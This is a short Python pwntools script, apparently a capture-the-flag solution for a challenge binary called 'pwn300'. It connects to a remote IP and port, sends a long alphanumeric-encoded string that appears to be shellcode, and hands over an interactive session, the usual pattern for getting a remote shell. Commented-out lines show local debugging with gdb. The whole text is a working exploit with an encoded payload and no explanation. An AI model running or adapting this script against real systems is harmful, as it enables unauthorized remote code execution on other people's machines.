from pwn import*

#p=process("./pwn300")
#gdb.attach(proc.pidof(p)[0])
p = remote("118.89.138.44",30011)
p.sendline("Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M15103e0y4s3c1n0x0H8K2D1K3L7N2l0Y2v7O0g0K2C0e2l5L0w2w14164x0z1m3r0V070v")
p.interactive()
